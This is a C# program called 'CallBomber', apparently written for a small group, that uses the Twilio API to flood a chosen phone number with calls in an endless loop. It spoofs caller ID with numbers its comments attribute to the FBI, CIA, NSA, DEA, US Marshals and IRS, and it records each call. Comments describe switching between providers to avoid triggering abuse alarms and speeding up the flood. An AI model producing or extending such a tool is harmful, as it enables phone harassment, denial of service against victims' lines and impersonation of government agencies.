/* This is for AMD only, is not to be shared
If I catch you fuckers giving this code out you will be castrated
do NOT let ANON get hands on this - mosinu

I marked few places i need to config this so I do not have to keep giving 
code away also need to add a way to do this with google and make source random.
Right now this will do about 30 calls per second...if i threat it i can double that if
I can add google to twilo, lets me bounce between them, keep from setting off alarms. 
twilio catches on fast
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using Twilio; /* Run 'Install-Package Twilio' in NuGet Package Manager console */
using Twilio.Rest.Api.V2010.Account;
using Twilio.Types;

namespace CallBomber
{
    class Program
    {
        /* really need to make this a config but im to lazy atm, one of you others fix this 
        none of info below is valid replace with own shit*/
        public static string accountSid = "somethinghere";
        public static string authtoken = "md5 string here";
        /* these are numbers we show on caller id, should be in config also 
        currently these are fbi, us marshals, cia, nsa, dea and irs
        I really need to make this an array and make it random but for now this is fun*/
        public static List<string> numbers = new List<string>(new string[] { "+12023243000", "+12023079100", "+17034820623", "+15712043800", "+19122672505", "+12143666970", "+19729159655", "+17037401699", "+18003664484", "+18008291040", "+19122672505", "+14056803400", "+18164671900", });
        public static List<string> numbersInUse = new List<string>();
        public static string NumToCall = "";
        static void Main(string[] args)
        {
            Console.WriteLine(@"
            
 .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |
| |      __      | || | ____    ____ | || |  ________    | |
| |     /  \     | || ||_   \  /   _|| || | |_   ___ `.  | |
| |    / /\ \    | || |  |   \/   |  | || |   | |   `. \ | |
| |   / ____ \   | || |  | |\  /| |  | || |   | |    | | | |
| | _/ /    \ \_ | || | _| |_\/_| |_ | || |  _| |___.' / | |
| ||____|  |____|| || ||_____||_____|| || | |________.'  | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
                      
            ");

            Console.WriteLine("Enter the target number to start flood (1 MUST BE IN FRONT!):");
            NumToCall = Console.ReadLine();
            Console.WriteLine("Press ENTER to start the war, Otherwise exit now. Remember once unleashed all hell breaks loose.");

            Console.ReadLine();
            Console.Clear();
            TwilioClient.Init(accountSid, authtoken);

            var count = 1;
            // do while loop 
            do
            {
                Console.WriteLine("Starting Call Batch " + count.ToString() + " [" + numbers.Count + " Nums.)"); // this line needs to be fixed
                foreach (string num in numbers)
                {
                    Call(num);
                    System.Threading.Thread.Sleep(1000);
                }
                count++;
                System.Threading.Thread.Sleep(5000);
            } while (true);
        }

        // Call Function

        static void Call(string FromNumber)
        {
            try
            {
                var call = CallResource.Create(
                     new PhoneNumber(NumToCall),
                     new PhoneNumber(FromNumber),
                     record: true,
                     /* needs to go in a config also */
                     url: new Uri("https://url/")
                     //url: new Uri("/*A URL that returns TwiML markup*/")
               );

                Console.WriteLine(string.Format($"Started call to :" + call.To + " from: " + FromNumber));

            }
            catch (Exception Ex)
            {
                Console.WriteLine(string.Format($"Error on number {FromNumber}: {Ex.Message}"));
            }

        }
    }
}